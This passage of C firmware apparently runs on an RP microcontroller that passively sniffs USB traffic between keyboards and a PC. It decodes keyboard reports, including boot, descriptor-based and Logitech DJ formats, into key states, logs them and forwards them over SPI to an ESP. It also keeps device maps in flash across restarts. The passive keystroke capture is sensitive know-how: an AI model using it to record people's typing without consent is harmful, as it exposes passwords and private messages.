        hid_device_t *d = hid_find(addr);
        hid_iface_t *f = d ? hid_iface_by_number(d, (uint8_t)index) : NULL;

        if (f && f->subclass == 1)
        {
            // The report length changes with the protocol, the toggle goes on. The keys the
            // reports of the other protocol held are let go.
            f->boot = value == 0;
            f->got = 0;
            f->keep = 0;
            printf("usb hid: 0x%x if%u %s protocol\r\n", addr, f->number, f->boot ? "boot" : "report");
            hid_drop_sources(d, (uint8_t)(f - d->ifaces));

            if (d->n || d->mod)
            {
                hid_union(d);
            }
        }
    }
}

static void hid_ctrl_data(uint8_t addr, uint8_t pid, const uint8_t *data, int n)
{
    hid_ctrl_t *c = hid_ctrl_of(addr);

    // The same toggle twice is a resend: the device missed the PC's ACK.
    if (!c || pid == c->last_pid)
    {
        return;
    }

    c->last_pid = pid;
    c->stamp = ++hid_clock;

    int room = HID_DESC_MAX - c->len;
    int take = n < room ? n : room;

    memcpy(&c->buf[c->len], data, take);
    c->len += take;

    // The data stage ends at wLength, at a packet shorter than EP0's, or at the length the
    // descriptor itself declares.
    hid_device_t *d = hid_find(addr);
    int maxp0 = d && d->maxp0 ? d->maxp0 : 0;
    bool done = c->len >= c->want || n == 0 || (maxp0 && n < maxp0) || c->len >= HID_DESC_MAX;

    if (c->type == 1 && c->len >= 18)
    {
        done = true;
    }
    else if (c->type == 2 && c->len >= 4 && c->len >= (c->buf[2] | (c->buf[3] << 8)))
    {
        done = true;
    }
    else if (c->type == 0x22 && d)
    {
        hid_iface_t *f = hid_iface_by_number(d, c->index);

        if (f && f->rdlen && c->len >= f->rdlen)
        {
            done = true;
        }
    }

    if (done)
    {
        hid_ctrl_finish(c);
    }
}

// ---- reports ----------------------------------------------------------------------------

static uint32_t hid_bits(const uint8_t *p, int n, uint32_t bit, uint32_t size)
{
    uint32_t v = 0;

    for (uint32_t k = 0; k < size; k++)
    {
        uint32_t b = bit + k;

        if (b / 8 < (uint32_t)n && (p[b / 8] >> (b % 8)) & 1)
        {
            v |= 1u << k;
        }
    }

    return v;
}

static bool hid_has(const uint8_t *keys, int n, uint8_t k)
{
    for (int i = 0; i < n; i++)
    {
        if (keys[i] == k)
        {
            return true;
        }
    }

    return false;
}

static void hid_add_key(hid_source_t *s, uint32_t usage, bool *phantom)
{
    if (usage >= 1 && usage <= 3)
    {
        *phantom = true; // ErrorRollOver, POSTFail, ErrorUndefined: the key state is unknown
    }
    else if (usage >= HID_USAGE_MOD_FIRST && usage <= HID_USAGE_MOD_LAST)
    {
        s->mod |= 1u << (usage - HID_USAGE_MOD_FIRST);
    }
    else if (usage >= 4 && usage <= 0xff && s->n < HID_KEYS && !hid_has(s->keys, s->n, (uint8_t)usage))
    {
        s->keys[s->n++] = (uint8_t)usage;
    }
}

// The keys of one report, by its fields. Returns false for a phantom state, to be ignored.
static bool hid_decode(const hid_device_t *d, const hid_report_t *rep, const uint8_t *p, int n, hid_source_t *s)
{
    bool phantom = false;

    s->mod = 0;
    s->n = 0;

    for (int k = 0; k < rep->n; k++)
    {
        const hid_field_t *f = &d->fields[rep->first + k];

        for (int e = 0; e < f->count; e++)
        {
            if (f->kind == HID_BITS)
            {
                if (hid_bits(p, n, f->bit + e, 1))
                {
                    hid_add_key(s, (uint32_t)f->usage + e, &phantom);
                }
                continue;
            }

            int32_t v = (int32_t)hid_bits(p, n, f->bit + e * f->size, f->size);

            if (f->sign && (v >> (f->size - 1)) & 1)
            {
                v -= 1 << f->size;
            }

            if (v >= f->lmin && v <= f->lmax)
            {
                uint32_t usage = (uint32_t)f->usage + (uint32_t)(v - f->lmin);

                if (usage)
                {
                    hid_add_key(s, usage, &phantom);
                }
            }
        }
    }

    return !phantom;
}

// The fixed 8-byte layout a keyboard sends under the boot protocol.
static bool hid_decode_boot(const uint8_t *p, int n, hid_source_t *s)
{
    bool phantom = false;

    s->mod = n > 0 ? p[0] : 0;
    s->n = 0;

    for (int k = 2; k < 8 && k < n; k++)
    {
        if (p[k])
        {
            hid_add_key(s, p[k], &phantom);
        }
    }

    return !phantom;
}

// A Logitech receiver that Linux's hid-logitech-dj switched to DJ mode sends the keys of each paired
// keyboard in the DJ short report: ID 0x20, 14 bytes on a vendor page, holding the device index, the
// report type (1 for a keyboard), then the modifiers and six keys, with no reserved byte between
// them. Windows leaves the receiver on its boot keyboard interface. A Unifying receiver (046d:c52b)
// with a K400 Plus on a Linux PC, 2026-11-09: 48 key states in these reports on EP 0x83, none on the
// boot interface.
static bool hid_dj_keys(const hid_device_t *d, const hid_report_t *rep, const uint8_t *p, int n)
{
    return d->desc_len >= 10 && (d->desc[8] | d->desc[9] << 8) == 0x046D && rep->id == 0x20 &&
           rep->bytes == 14 && n >= 9 && p[1] == 0x01;
}

static bool hid_decode_dj(const uint8_t *p, int n, hid_source_t *s)
{
    bool phantom = false;

    s->mod = p[2];
    s->n = 0;

    for (int k = 3; k < 9 && k < n; k++)
    {
        if (p[k])
        {
            hid_add_key(s, p[k], &phantom);
        }
    }

    return !phantom;
}

static hid_source_t *hid_source(hid_device_t *d, uint8_t iface, uint8_t id)
{
    for (int i = 0; i < d->n_sources; i++)
    {
        if (d->sources[i].iface == iface && d->sources[i].id == id)
        {
            return &d->sources[i];
        }
    }

    if (d->n_sources >= HID_SOURCES)
    {
        return NULL;
    }

    hid_source_t *s = &d->sources[d->n_sources++];
    memset(s, 0, sizeof(*s));
    s->iface = iface;
    s->id = id;
    return s;
}

// The device's key state as one record, logged and queued for the ESP.
static void hid_ship(const hid_device_t *d)
{
    char *frame = hid_frame;
    int at = snprintf(frame, SPI_FRAME_SIZE, "KB: 0x%x 0x%x", d->addr, d->mod);

    for (int k = 0; k < d->n && at < SPI_FRAME_SIZE - 8; k++)
    {
        at += snprintf(frame + at, SPI_FRAME_SIZE - at, " 0x%x", d->keys[k]);
    }

    snprintf(frame + at, SPI_FRAME_SIZE - at, ";\r\n");
    memset(frame + at + 3, 0, SPI_FRAME_SIZE - at - 3);
    printf("%s", frame);
    usb_report_dispatch(frame);
}

// Ship the device's key state when it changed: keys still held keep their place, new ones follow.
static void hid_union(hid_device_t *d)
{
    uint8_t keys[HID_KEYS], mod = 0;
    int n = 0;

    for (int i = 0; i < d->n_sources; i++)
    {
        mod |= d->sources[i].mod;
    }

    for (int k = 0; k < d->n; k++)
    {
        for (int i = 0; i < d->n_sources; i++)
        {
            if (hid_has(d->sources[i].keys, d->sources[i].n, d->keys[k]))
            {
                keys[n++] = d->keys[k];
                break;
            }
        }
    }

    for (int i = 0; i < d->n_sources; i++)
    {
        for (int k = 0; k < d->sources[i].n && n < HID_KEYS; k++)
        {
            if (!hid_has(keys, n, d->sources[i].keys[k]))
            {
                keys[n++] = d->sources[i].keys[k];
            }
        }
    }

    if (mod == d->mod && n == d->n && memcmp(keys, d->keys, n) == 0)
    {
        printf("KB: 0x%x same;\r\n", d->addr);
        return;
    }

    d->mod = mod;
    d->n = n;
    memcpy(d->keys, keys, n);
    hid_ship(d);
}

// Whether a report of an interface is the 8-byte boot layout. Under the boot protocol it is, unless
// its length (and ID) make it one of the reports the descriptor declares: a HyperX Alloy FPS keeps
// sending its 16-byte report 9 there, on an interface that says it is a boot mouse. Under the report
// protocol, 8 bytes from a boot keyboard that are none of the declared reports are the boot layout
// too: a Logitech Bolt receiver switched every interface on a SET_PROTOCOL sent to its mouse.
static bool hid_boot_layout(hid_device_t *d, hid_iface_t *f, const uint8_t *p, int n)
{
    uint8_t idx = (uint8_t)(f - d->ifaces);
    hid_report_t *rep = !f->parsed ? NULL
                        : !f->ids  ? hid_report_for(d, idx, 0, false)
                        : n > 0    ? hid_report_for(d, idx, p[0], false)
                                   : NULL;
    bool declared = rep && n == rep->bytes + (f->ids ? 1 : 0);

    if (f->boot)
    {
        return !declared || n == 8;
    }

    return f->subclass == 1 && f->protocol == 1 && f->parsed && n == 8 && !declared;
}

// One whole report of an interface.
static void hid_report(hid_device_t *d, hid_iface_t *f, const uint8_t *p, int n)
{
    uint8_t idx = (uint8_t)(f - d->ifaces);
    hid_source_t s;
    bool ok;
    uint8_t id = 0;

    memset(&s, 0, sizeof(s));

    if (hid_boot_layout(d, f, p, n))
    {
        // The boot protocol: the fixed keyboard layout, or a boot mouse, which carries no key.
        if (f->protocol != 1)
        {
            return;
        }

        ok = hid_decode_boot(p, n, &s);
    }
    else
    {
        if (f->ids)
        {
            if (n < 1)
            {
                return;
            }

            id = p[0];
            p++;
            n--;
        }

        hid_report_t *rep = hid_report_for(d, idx, id, false);

        if (rep && rep->n == 0 && hid_dj_keys(d, rep, p, n))
        {
            ok = hid_decode_dj(p, n, &s);
            id = (uint8_t)(0x80 | (p[0] & 0x7F)); // one source per paired keyboard
        }
        else if (!rep || rep->n == 0)
        {
            return; // a report with no key in it: mouse, media, vendor
        }
        else
        {
            ok = hid_decode(d, rep, p, n, &s);
        }
    }

    hid_source_t *dst = hid_source(d, idx, id);

    if (!ok)
    {
        // ErrorRollOver (too many keys down): which keys are held is unknown, so they stay as they
        // were, while the modifiers, in their own field, still count. Linux's hid-core.c ignores
        // the key field alone the same way.
        printf("KB: 0x%x phantom;\r\n", d->addr);

        if (dst)
        {
            dst->mod = s.mod;
        }
    }
    else if (dst)
    {
        dst->mod = s.mod;
        dst->n = s.n;
        memcpy(dst->keys, s.keys, s.n);
    }

    hid_union(d);
}

static uint16_t hid_sum(const uint8_t *p, int n)
{
    uint32_t h = 2166136261u ^ (uint32_t)n;

    for (int i = 0; i < n; i++)
    {
        h = (h ^ p[i]) * 16777619u;
    }

    return (uint16_t)(h ^ (h >> 16));
}

// One interrupt IN packet of an HID interface whose layout is known. A report longer than the
// endpoint's packets comes in a transfer of several, which ends at a short packet or at the length
// the PC asked for, the interface's longest input report.
static void hid_interrupt(hid_device_t *d, hid_iface_t *f, uint8_t addr, uint8_t pid, const uint8_t *data, int n)
{
    uint16_t sum = hid_sum(data, n);
    uint16_t rlen = f->boot ? 8 : f->rlen;

    // The DATA0/DATA1 toggle alternates on every packet the PC acknowledges. The same toggle with
    // the same bytes is a resend (the device missed the ACK); with other bytes, the packet between
    // the two went unseen.
    if (pid == f->tog && sum == f->sum)
    {
        return;
    }

    bool lost = pid == f->tog;
    bool mine = hid_long.len && hid_long.addr == addr && hid_long.ep == f->ep;

    f->tog = pid;
    f->sum = sum;

    if (lost && f->got)
    {
        // The unseen packet was a full one of the transfer in progress: that report is lost.
        f->got += f->maxp;
        f->keep = 0;

        if (f->got >= rlen)
        {
            f->got = 0; // it was the last one, and this packet starts the next transfer
        }
    }
    else if (lost && rlen > f->maxp && !f->ids)
    {
        // Every transfer here is the one long report: the unseen packet began one, this continues it.
        f->got = f->maxp;
        f->keep = 0;
    }
    else if (lost && rlen > f->maxp && n < f->maxp)
    {
        return; // it may end a transfer whose first packet went unseen
    }

    if (f->got)
    {
        bool collect = f->keep && mine;

        if (collect)
        {
            int take = n < HID_REPORT_MAX - hid_long.len ? n : HID_REPORT_MAX - hid_long.len;
            memcpy(&hid_long.buf[hid_long.len], data, take);
            hid_long.len += take;
        }

        f->got += n;

        if (n < f->maxp || f->got >= rlen)
        {
            f->got = 0;

            if (collect)
            {
                int len = hid_long.len;
                hid_long.len = 0;
                hid_report(d, f, hid_long.buf, len);
            }
        }

        return;
    }

    if (n == 0)
    {
        return; // a zero-length packet between transfers ends nothing
    }

    if (f->maxp && n == f->maxp && rlen > n)
    {
        // The first packet of a transfer longer than one packet.
        f->got = n;
        f->keep = 1;
        hid_long.addr = addr;
        hid_long.ep = f->ep;
        memcpy(hid_long.buf, data, n < HID_REPORT_MAX ? n : HID_REPORT_MAX);
        hid_long.len = n < HID_REPORT_MAX ? n : HID_REPORT_MAX;
        return;
    }

    hid_report(d, f, data, n);
}

// A packet the parked maps could have made: a declared report with its ID byte, the first packet
// of a longer one, or the boot layout of a boot keyboard. Another device that took the address while
// the RP did not see its enumeration (a restart, maps from flash) sends something else first.
static bool hid_unpark_fits(hid_device_t *d, hid_iface_t *f, const uint8_t *p, int n)
{
    if (!f->hid || !f->parsed)
    {
        return true;
    }

    if ((f->maxp && n == f->maxp && f->rlen > n) || (f->subclass == 1 && f->protocol == 1 && n == 8))
    {
        return true;
    }

    hid_report_t *rep = hid_report_for(d, (uint8_t)(f - d->ifaces), f->ids ? (n ? p[0] : 0) : 0, false);
    return rep && n == rep->bytes + (f->ids ? 1 : 0);
}

// Every DATA a device returned to an IN, endpoint 0 included. Returns true when the device's
// descriptors decide what it means; false sends an interrupt report down the raw path.
static bool usb_hid_in(uint8_t addr, uint8_t ep, uint8_t pid, const uint8_t *data, int n)
{
    if (ep == 0)
    {
        hid_ctrl_data(addr, pid, data, n);
        return true;
    }

    hid_device_t *d = hid_find(addr);

    if (!d && addr)
    {
        // Interrupt traffic at the address of a parked device, on one of its endpoints: the PC put
        // it back there without reading a descriptor (SET_ADDRESS and SET_CONFIGURATION alone
        // after a port reset), or the reset was not one.
        hid_device_t *p = hid_find(addr | 0x80);
        hid_iface_t *pf = p ? hid_iface_by_ep(p, ep) : NULL;

        if (pf && hid_unpark_fits(p, pf, data, n))
        {
            p->addr = addr;
            d = p;
            printf("usb hid: 0x%x back at its address, its maps kept\r\n", addr);
        }
    }

    if (!d || !d->configured)
    {
        return false;
    }

    // An endpoint that is no HID interrupt IN of its configuration carries no key.
    hid_iface_t *f = hid_iface_by_ep(d, ep);

    if (!f || !f->hid)
    {
        return true;
    }

    if (!f->parsed && !f->boot)
    {
        // The configuration was seen but not this interface's report descriptor: a boot mouse is
        // still known to carry no key; anything else goes down the raw path.
        return f->protocol == 2 && f->subclass == 1;
    }

    hid_interrupt(d, f, addr, pid, data, n);
    return true;
}

// A bus reset: every device starts over in the report protocol with no key held. A device that
// still had keys down ships an empty state, so a page that tracks it does not keep them held, and
// a configured one is parked until it comes back (hid_park()).
static void usb_hid_bus_reset(void)
{
    // Windows reads the first packet of the device descriptor at the default address and resets:
    // that packet still gives the EP0 size.
    for (int i = 0; i < HID_CTRL; i++)
    {
        hid_ctrl_finish(&hid_ctrl[i]);
    }

    hid_long.len = 0;

    for (int i = 0; i < HID_DEVICES; i++)
    {
        hid_device_t *d = &hid_devices[i];

        if (d->used && d->configured && !(d->addr & 0x80))
        {
            hid_park(d);
            continue;
        }

        for (int k = 0; k < d->n_ifaces; k++)
        {
            d->ifaces[k].boot = 0;
            hid_restart(&d->ifaces[k], d->addr);
        }

        d->n_sources = 0;

        if (d->used && (d->n || d->mod))
        {
            d->n = 0;
            d->mod = 0;
            hid_ship(d);
        }
    }
}

// ---- the maps kept across a restart -----------------------------------------------------
//
// An OTA commit or a watchdog reset restarts the RP under devices that stay configured: the PC
// reads no descriptor again, so without their maps a wider format is lost until the device is
// plugged in again, and a composite receiver's mouse reports go down the raw path, where a move
// can pass for keys. okhi.c writes what hid_store_save() builds to a ring of flash sectors, each
// write to the next sector with the next sequence number, and hands the valid record with the
// highest one to hid_store_load() at boot, which parks each device at its old address: its
// interrupt traffic there (usb_hid_in()) or its device descriptor at an enumeration (hid_adopt())
// brings it back, as after a bus reset. Only the maps are kept, never a key state.
//
// Bump HID_STORE_VERSION whenever a stored field changes meaning; a change of size changes the
// layout word on its own. A record of another layout is not loaded.

#define HID_STORE_MAGIC 0x3150414du // "MAP1"
#define HID_STORE_VERSION 2u

typedef struct
{
    uint32_t magic;
    uint32_t layout; // hid_store_layout()
    uint32_t seq;    // which write this is: the newest record has the highest
    uint32_t len;    // bytes of device records after this header
    uint32_t crc;    // CRC-32 of this header, crc as 0, and of those bytes
} hid_store_head_t;

typedef struct
{
    uint8_t addr;
    uint8_t maxp0;
    uint8_t n_ifaces;
    uint8_t n_reports;
    uint8_t n_fields;
    uint8_t desc_len;
    uint8_t desc[18];
} hid_store_dev_t; // then n_ifaces hid_iface_t, n_reports hid_report_t, n_fields hid_field_t

static uint32_t hid_store_layout(void)
{
    return HID_STORE_VERSION << 24 | (uint32_t)sizeof(hid_iface_t) << 16 | (uint32_t)sizeof(hid_report_t) << 8 |
           (uint32_t)sizeof(hid_field_t);
}

static uint32_t hid_store_crc_add(uint32_t crc, const uint8_t *p, int n)
{
    for (int i = 0; i < n; i++)
    {
        crc ^= p[i];

        for (int k = 0; k < 8; k++)
        {
            crc = (crc >> 1) ^ (0xedb88320u & (0u - (crc & 1u)));
        }
    }

    return crc;
}

// The CRC-32 of a record: its header with the crc field as 0, then its body.
static uint32_t hid_store_crc(const hid_store_head_t *head, const uint8_t *body)
{
    hid_store_head_t h = *head;

    h.crc = 0;
    return ~hid_store_crc_add(hid_store_crc_add(0xffffffffu, (const uint8_t *)&h, (int)sizeof(h)), body,
                              (int)head->len);
}

static int hid_store_dev_bytes(int n_ifaces, int n_reports, int n_fields)
{
    return (int)sizeof(hid_store_dev_t) + n_ifaces * (int)sizeof(hid_iface_t) + n_reports * (int)sizeof(hid_report_t) +
           n_fields * (int)sizeof(hid_field_t);
}

// Whether buf holds a whole record of this layout; *seq gets its sequence number.
static bool hid_store_valid(const uint8_t *buf, int max, uint32_t *seq)
{
    hid_store_head_t h;

    if (max < (int)sizeof(h))
    {
        return false;
    }

    memcpy(&h, buf, sizeof(h));

    if (h.magic != HID_STORE_MAGIC || h.layout != hid_store_layout() || h.len > (uint32_t)(max - (int)sizeof(h)) ||
        hid_store_crc(&h, buf + sizeof(h)) != h.crc)
    {
        return false;
    }

    *seq = h.seq;
    return true;
}

// The maps of every configured device, the most recently used first, as many as fit in max bytes,
// into buf, numbered seq. Returns the bytes used, the header included; *devices gets how many.
static int hid_store_save(uint8_t *buf, int max, uint32_t seq, int *devices)
{
    hid_store_head_t h;
    int at = (int)sizeof(h);
    uint32_t done = 0;

    *devices = 0;
    hid_store_dirty = false;

    for (;;)
    {
        int best = -1;

        for (int i = 0; i < HID_DEVICES; i++)
        {
            const hid_device_t *d = &hid_devices[i];

            if (!(done & (1u << i)) && d->used && d->configured && (d->addr & 0x7f) &&
                (best < 0 || d->stamp > hid_devices[best].stamp))
            {
                best = i;
            }
        }

        if (best < 0)
        {
            break;
        }

        done |= 1u << best;

        const hid_device_t *d = &hid_devices[best];

        if (at + hid_store_dev_bytes(d->n_ifaces, d->n_reports, d->n_fields) > max)
        {
            continue; // a smaller one may still fit
        }

        hid_store_dev_t r;

        memset(&r, 0, sizeof(r));
        r.addr = d->addr & 0x7f;
        r.maxp0 = d->maxp0;
        r.n_ifaces = d->n_ifaces;
        r.n_reports = d->n_reports;
        r.n_fields = d->n_fields;
        r.desc_len = d->desc_len;
        memcpy(r.desc, d->desc, sizeof(r.desc));
        memcpy(buf + at, &r, sizeof(r));
        at += (int)sizeof(r);

        for (int k = 0; k < d->n_ifaces; k++)
        {
            // What the PC set or the wire carried last is not kept: after a restart the endpoint
            // toggle is unknown and no transfer is in progress.
            hid_iface_t f = d->ifaces[k];

            f.boot = 0;
            f.tog = 0;
            f.keep = 0;
            f.sum = 0;
            f.got = 0;
            memcpy(buf + at, &f, sizeof(f));
            at += (int)sizeof(f);
        }

        memcpy(buf + at, d->reports, d->n_reports * sizeof(hid_report_t));
        at += d->n_reports * (int)sizeof(hid_report_t);

        for (int k = 0; k < d->n_fields; k++)
        {
            // Member by member over zeros: the padding after sign holds whatever the parser's
            // temporary had, and the record is compared byte for byte with the newest one.
            const hid_field_t *s = &d->fields[k];
            hid_field_t f;

            memset(&f, 0, sizeof(f));
            f.bit = s->bit;
            f.usage = s->usage;
            f.count = s->count;
            f.size = s->size;
            f.kind = s->kind;
            f.sign = s->sign;
            f.lmin = s->lmin;
            f.lmax = s->lmax;
            memcpy(buf + at, &f, sizeof(f));
            at += (int)sizeof(f);
        }

        (*devices)++;
    }

    memset(&h, 0, sizeof(h));
    h.magic = HID_STORE_MAGIC;
    h.layout = hid_store_layout();
    h.seq = seq;
    h.len = (uint32_t)(at - (int)sizeof(h));
    h.crc = hid_store_crc(&h, buf + sizeof(h));
    memcpy(buf, &h, sizeof(h));

    return at;
}

// What hid_store_save() wrote, read at boot before any packet: each device into a free slot,
// parked at its old address. Returns the devices loaded, -1 for no valid record.
static int hid_store_load(const uint8_t *buf, int max)
{
    hid_store_head_t h;
    uint32_t seq;

    if (!hid_store_valid(buf, max, &seq))
    {
        return -1;
    }

    memcpy(&h, buf, sizeof(h));

    int at = (int)sizeof(h);
    int end = at + (int)h.len;
    int loaded = 0;

    while (at + (int)sizeof(hid_store_dev_t) <= end)
    {
        hid_store_dev_t r;

        memcpy(&r, buf + at, sizeof(r));
        at += (int)sizeof(r);

        int need = hid_store_dev_bytes(r.n_ifaces, r.n_reports, r.n_fields) - (int)sizeof(r);
        hid_device_t *d = NULL;

        for (int i = 0; i < HID_DEVICES && !d; i++)
        {
            if (!hid_devices[i].used)
            {
                d = &hid_devices[i];
            }
        }

        if (!d || r.n_ifaces > HID_IFACES || r.n_reports > HID_REPORTS || r.n_fields > HID_FIELDS ||
            r.desc_len > 18 || r.addr == 0 || r.addr > 127 || at + need > end)
        {
            break; // nothing after a record that does not fit can be trusted either
        }

        memset(d, 0, sizeof(*d));
        d->maxp0 = r.maxp0;
        d->n_ifaces = r.n_ifaces;
        d->n_reports = r.n_reports;
        d->n_fields = r.n_fields;
        d->desc_len = r.desc_len;
        memcpy(d->desc, r.desc, sizeof(d->desc));
        memcpy(d->ifaces, buf + at, r.n_ifaces * sizeof(hid_iface_t));
        at += r.n_ifaces * (int)sizeof(hid_iface_t);
        memcpy(d->reports, buf + at, r.n_reports * sizeof(hid_report_t));
        at += r.n_reports * (int)sizeof(hid_report_t);
        memcpy(d->fields, buf + at, r.n_fields * sizeof(hid_field_t));
        at += r.n_fields * (int)sizeof(hid_field_t);

        // The decoder indexes the pools with these, so they are checked as the parser would build
        // them: a report's fields inside the pool and its interface a known one, array slots of 1
        // to 16 bits.
        bool ok = true;

        for (int k = 0; k < d->n_reports && ok; k++)
        {
            const hid_report_t *rep = &d->reports[k];
            ok = rep->iface < d->n_ifaces && rep->first + rep->n <= d->n_fields;
        }

        for (int k = 0; k < d->n_fields && ok; k++)
        {
            const hid_field_t *f = &d->fields[k];
            ok = f->kind == HID_BITS || (f->kind == HID_ARRAY && f->size >= 1 && f->size <= 16);
        }

        if (!ok)
        {
            memset(d, 0, sizeof(*d));
            break;
        }

        d->used = 1;
        d->configured = 1;
        d->addr = r.addr | 0x80;
        d->stamp = (uint32_t)(HID_DEVICES - loaded); // records go most recently used first
        loaded++;

        printf("usb hid: 0x%x %04x:%04x maps from flash, parked until it shows up\r\n", r.addr,
               r.desc_len >= 12 ? (unsigned)(r.desc[8] | (r.desc[9] << 8)) : 0u,
               r.desc_len >= 12 ? (unsigned)(r.desc[10] | (r.desc[11] << 8)) : 0u);
    }

    hid_clock = HID_DEVICES;
    hid_store_dirty = false;
    return loaded;
}

#endif // USB_HID_H
